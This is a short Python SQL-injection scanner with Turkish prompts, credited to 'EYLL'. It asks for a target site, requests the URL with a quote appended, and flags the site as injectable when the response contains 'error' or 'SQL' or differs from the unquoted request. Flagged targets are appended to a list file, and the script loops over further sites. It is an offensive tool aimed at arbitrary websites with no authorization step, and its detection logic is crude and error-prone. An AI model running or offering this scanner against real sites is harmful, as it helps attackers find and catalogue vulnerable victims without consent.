### Coded by EYLL'
### github link : https://www.github.com/arda6
import requests
from colorama import Fore , init
init(autoreset=True)
print(Fore.LIGHTBLACK_EX + """
 _______  _____         _______ _______ _______ __   _ __   _ _______  ______ 
 |______ |   __| |      |______ |       |_____| | \  | | \  | |______ |_____/
 ______| |____\| |_____ ______| |_____  |     | |  \_| |  \_| |______ |    \_
 
                                                        Powered by EYLL'
                                                        o yabancı pop severdi                     
                                                        
""")
site = input("[?] Hedef Site Girin : ")
url = requests.get(r""+site+"'")
url2 = requests.get(r""+site+"")
sql = str(url.content)
sql2 = str(url2.content)
if sql.find("error") == int('-1'):
        print("")
        print(Fore.YELLOW+"[#] "+site+" Hedefte Açık Tespit Edilemedi Tekrar Deneniyor")
        print("")
        if sql.find("SQL")  == int("-1"):
            print(Fore.YELLOW+"[#] Açık Bulundamadı Blind SQL Deneniyor")
            print("")
            if sql == sql2 :
                print(Fore.RED+"[#] Blind SQL Bulunamadı")
                print("")
            elif sql2 != sql :
                print(Fore.GREEN+"[#] Blind SQL Bulundu ( TEST ) ")
                print("")
                dosya = open("list.txt", "a", encoding="utf-8")
                dosya.write(r"Blind (Test) " + site + "\n")
        else :
            print(Fore.GREEN+"[#] Açık Bulundu")
            dosya = open("list.txt", "a", encoding="utf-8")
            dosya.write(r"" + site + "\n")
else :
        print("")
        print(Fore.GREEN+"[#]"+site+" Hedefte SQL İnjection Tespit Edildi")
        print("")
        dosya = open("list.txt", "a", encoding="utf-8")
        dosya.write(r""+site+"\n")
while True:
    site = input("[?] Hedef Site Girin : ")
    url = requests.get(r""+site+"'")
    url2 = requests.get(r""+site+"")
    sql = str(url.content)
    sql2 = str(url2.content)
    if sql.find("error") == int('-1'):
        print("")
        print(Fore.YELLOW+"[#] "+site+" Hedefte Açık Tespit Edilemedi Tekrar Deneniyor")
        print("")
        if sql.find("SQL") == int("-1"):
            print(Fore.YELLOW+"[#] Hedefte Açık Bulunamadı Blind SQL Deneniyor")
            print("")
            if sql == sql2:
                print(Fore.RED + "[#] Blind SQL Bulunamadı")
                print("")
            elif sql != sql2 :
                print(Fore.GREEN + "[#] Blind SQL Bulundu ( TEST )")
                print("")
                dosya = open("list.txt", "a", encoding="utf-8")
                dosya.write(r"Blind (TEST) " + site + "\n")
        else :
            print(Fore.GREEN+"[#] Hedefte Açık Tespit Edildi")
            dosya = open("list.txt", "a", encoding="utf-8")
            dosya.write(r"" + site + "\n")
    else:
        print("")
        print(Fore.GREEN+"[#] "+site+  " Hedefte SQL İnjection Tespit Edildi")
        print("")
        dosya = open("list.txt", "a", encoding="utf-8")
        dosya.write(r""+site+"\n")
